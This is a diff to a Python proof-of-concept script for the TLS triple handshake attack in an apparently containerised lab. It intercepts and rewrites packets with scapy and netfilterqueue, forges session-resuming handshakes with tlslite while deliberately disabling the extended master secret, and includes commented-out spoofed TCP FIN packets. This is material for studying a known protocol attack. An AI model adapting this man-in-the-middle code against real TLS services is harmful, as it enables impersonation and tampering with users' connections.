@@ -24,7 +24,7 @@ from scapy.main import load_layer
 from scapy.packet import Packet
 from scapy.sendrecv import send
 from scapy.utils import hexdump
-from tlslite import X509, X509CertChain, parsePEMKey, HandshakeSettings, SessionCache, Checker
+from tlslite import X509, X509CertChain, parsePEMKey, HandshakeSettings, SessionCache, Checker, Session
 from tlslite.utils.aes import AES
 from tlslite.utils.compat import bytes_to_int
 
@@ -857,7 +857,15 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
                     print(final_packet_after_manual_insertion.show2())
 
                     pkt.set_payload(bytes(final_packet_after_manual_insertion))
-
+                    #
+                    # rst_packet_for_server = IP(dst="172.18.0.3", src="172.18.0.2")/TCP(dport=scpy_pkt[TCP].dport, sport=scpy_pkt[TCP].sport, flags='F', seq=final_packet_after_manual_insertion[TCP].seq + 1, ack=final_packet_after_manual_insertion[TCP].ack)
+                    # rst_packet_for_client = IP(dst="172.18.0.2", src="172.18.0.3")/TCP(dport=scpy_pkt[TCP].sport, sport=scpy_pkt[TCP].dport, flags='F', seq=final_packet_after_manual_insertion[TCP].ack + 1, ack=final_packet_after_manual_insertion[TCP].seq)
+                    #
+                    # rst_packet_for_client.show2()
+                    # rst_packet_for_server.show2()
+                    #
+                    # send(rst_packet_for_server)
+                    # send(rst_packet_for_client)
 
                     applicationdata_mangled  = True
 
@@ -925,35 +933,39 @@ if __name__ == '__main__':
 
         print(server_certificate.sigalg)
         print(server_certificate)
-
         settings = HandshakeSettings()
         settings.cipherNames=["aes256gcm", "aes256"]
         settings.maxVersion = TLS_VERSION
         settings.keyExchangeNames = ["rsa", "dhe_rsa"]
         settings.useEncryptThenMAC = False
         settings.useExtendedMasterSecret = False # VERYYYYYY IMPORTANT!!!!!!!!!!!!!!!!!!!!! The triple handshake attack doesn't work if this is ON!!!
-                                                 #section 4 RFC 7627
+                                                  #section 4 RFC 7627
         try:
+            oldSession = Session()
+
             conn.handshakeClientCert(chain,
                                      private_key,
+                                     serverName="server",
+                                     session=oldSession,
                                      settings=settings#,
                                      # checker= Checker(x509Fingerprint=server_certificate.getFingerprint())
                                      )  # we pass the client certificate and private key to the function, even if the server will not (initially, phase 1) ask for it.
             print("Handshake done")
             oldSession = conn.session
             error_last_connection = False
+            i = 0
             while True:
-                if conn.closed or error_last_connection: #retry to connect with session resumption...
+                if conn.closed or error_last_connection or i == 3: #retry to connect with session resumption...
                     try:
-                        conn.close()
+                        print(" Is session valid? " + str(oldSession.valid()))
                         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         sock.settimeout(5)
                         sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                         sock.connect(("172.18.0.3", 443))
-                        # step 2. construct a TLSConnection
                         conn = tlslite.TLSConnection(sock)
                         conn.handshakeClientCert(chain,
                                                  private_key,
+                                                 serverName="server",
                                                  session=oldSession,
                                                  settings=settings)
                         oldSession = conn.session
@@ -962,6 +974,8 @@ if __name__ == '__main__':
                         print(e)
                 try:
                     conn.sendall(b"Send 50 to Alice")
+                    i += 1
+
                 except Exception as e:
                     error_last_connection = True
                     print(e) # just get the connection closed exception or broken pipe...
@@ -1033,23 +1047,16 @@ if __name__ == '__main__':
                 if auth_needed:
 
                     try:
-                        conn.close()
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                        # step 1s. bind the socket to our address (SERVER) and port, and start listening...
-                        sock.bind(("172.18.0.3", 443))
-                        sock.listen(1)
+                        # step 2. construct a TLSConnection
                         real_sock, client_address = sock.accept()  # accept returns a new socket object, representing the newly socket connected to the client! The old one continues to listen for new connections...
                         real_sock.settimeout(20)
-                        print(f"connected to {client_address}")
 
-                        # step 2. construct a TLSConnection
                         conn = tlslite.TLSConnection(real_sock)
                         conn.handshakeServer(certChain=chain,
                                              privateKey=private_key,
                                              settings=settings,
                                              sessionCache=sessionCache,
-                                             checker=Checker(client_certificate.getFingerprint(), checkResumedSession=True),
+                                             checker=Checker(client_certificate.getFingerprint()),
                                              reqCert=True)  # we pass the server certificate and private key to the function
                         print(b"Client authed and executed this command : " + msg)
                         auth_needed = False
